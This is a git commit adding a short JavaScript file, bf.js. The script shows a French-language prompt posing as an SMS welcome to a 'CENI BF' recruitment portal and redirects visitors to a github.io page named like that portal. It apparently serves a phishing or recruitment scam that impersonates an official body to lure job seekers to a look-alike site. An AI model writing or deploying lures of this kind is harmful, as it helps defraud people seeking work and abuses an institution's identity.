fc153554f1357aa40c8f1961404a2841b9105a9e
allregnws <promisebassey8081@gmail.com>
2025-04-27 20:08:23 +0100

    Create bf.js

---
+++ bf.js
@@ -0,0 +1,5 @@
+var password = 'CENI BF'
+password=prompt('SMS :Bienvenue sur notre portail de recrutement, cliquez sur OK pour démarrer la candidature  ','CENI BF');
+if (password != 'CENI BF') {
+location.href='https://allregnws.github.io/CENI.bf.Recrutement.Portail';
+}
